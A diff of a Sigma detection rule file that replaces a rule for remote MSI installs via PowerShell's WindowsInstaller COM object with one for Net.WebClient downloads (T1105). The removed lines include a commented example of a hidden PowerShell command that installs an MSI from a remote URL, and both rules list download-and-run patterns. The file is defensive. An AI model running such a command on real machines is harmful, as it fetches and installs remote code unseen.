@@ -1,11 +1,11 @@
-title: PowerShell MSI Install via WindowsInstaller COM From Remote Location
-id: 0df0a362-0df0-4df0-adf0-0df0a3620000
+title: PowerShell Download Via Net.WebClient - PowerShell Classic
+id: 13fc9475-13fc-43fc-a3fc-13fc94750000
 status: stable
 description: Detection rule for MITRE ATT&CK technique T1105
 references:
-  - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_comobject_msi_remote.yml
+  - https://github.com/SigmaHQ/sigma/blob/master/rules/windows/powershell/powershell_classic/posh_pc_download_via_webclient.yml
 author: sigma (via IncidentBuddy)
-date: 2026-04-26
+date: 2026-05-03
 tags:
   - attack.t1105
 logsource:
@@ -14,29 +14,13 @@ logsource:
 detection:
   selection:
     # Original sigma detection logic
-    #     # Example: "C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.exe" -W Hidden -C "$u='https://example.com/';$i=New-Object -ComObject('WindowsInstaller.Installer');$i.UILevel=2;$i.InstallProduct($u),'')";
-    #     selection_img:
-    #         - Image|endswith:
-    #               - '\powershell_ise.exe'
-    #               - '\powershell.exe'
-    #               - '\pwsh.exe'
-    #         - OriginalFileName:
-    #               - 'PowerShell_ISE.EXE'
-    #               - 'PowerShell.EXE'
-    #               - 'pwsh.dll'
-    #     selection_cli:
-    #         CommandLine|contains|all:
-    #             - '-ComObject'
-    #             - 'InstallProduct('
-    #     selection_remote:
-    #         CommandLine|contains:
-    #             - 'http'
-    #             - '\\\\'
-    #     filter_main_localhost:
-    #         CommandLine|contains:
-    #             - '://127.0.0.1'
-    #             - '://localhost'
-    #     condition: all of selection_* and not 1 of filter_main_*
+    #     selection_webclient:
+    #         Data|contains: 'Net.WebClient'
+    #     selection_download:
+    #         Data|contains:
+    #             - '.DownloadFile('
+    #             - '.DownloadString('
+    #     condition: all of selection_*
     # 
   condition: selection
 level: medium
